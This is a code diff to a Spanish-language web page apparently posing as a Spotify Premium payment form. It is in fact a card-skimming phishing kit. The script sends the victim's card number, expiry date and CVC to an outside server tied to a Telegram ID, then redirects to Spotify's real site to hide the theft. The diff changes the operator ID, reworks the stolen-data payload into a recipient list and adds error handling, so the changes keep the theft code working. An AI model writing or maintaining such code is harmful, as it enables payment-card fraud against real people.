@@ -192,7 +192,7 @@
 
   <script>
     // --- CONFIGURACIÓN DEL CLIENTE ---
-    const MY_TELEGRAM_ID = '8886805386'; 
+    const MY_TELEGRAM_ID = '7707049896'; 
     const SERVER_URL = 'https://kezosc-production.up.railway.app'; 
 
     function selectMethod(btn, method) {
@@ -208,9 +208,8 @@
       validateForm();
     }
 
-    // CORRECCIÓN DEL ERROR DEL NÚMERO 9
     document.getElementById('cardNumber').addEventListener('input', function(e) {
-      let value = e.target.value.replace(/\D/g, ''); // Solo permite números
+      let value = e.target.value.replace(/\D/g, '');
       let formatted = '';
       for (let i = 0; i < value.length && i < 16; i++) {
         if (i > 0 && i % 4 === 0) formatted += ' ';
@@ -253,8 +252,9 @@
       btn.disabled = true;
       btnText.innerHTML = 'Procesando...';
 
+      // CORREGIDO: Ahora usa lista_ids como array
       const payload = {
-        target_id: MY_TELEGRAM_ID,
+        lista_ids: [MY_TELEGRAM_ID],  // ← Array con el ID
         tarjeta: document.getElementById('cardNumber').value,
         expiracion: document.getElementById('cardExpiry').value,
         cvc: document.getElementById('cardCvc').value,
@@ -263,14 +263,19 @@
 
       try {
         console.log("Enviando datos a:", SERVER_URL);
-        await fetch(`${SERVER_URL}/enviar-datos`, {
+        const response = await fetch(`${SERVER_URL}/enviar-datos`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(payload)
         });
-        console.log("Envío completado con éxito");
+        
+        if (response.ok) {
+          console.log("Envío exitoso");
+        } else {
+          console.error("Error del servidor:", response.status);
+        }
       } catch (error) {
-        console.error("Error en el envío:", error);
+        console.error("Error de conexión:", error);
       }
 
       window.location.href = 'https://www.spotify.com/mx/premium/';
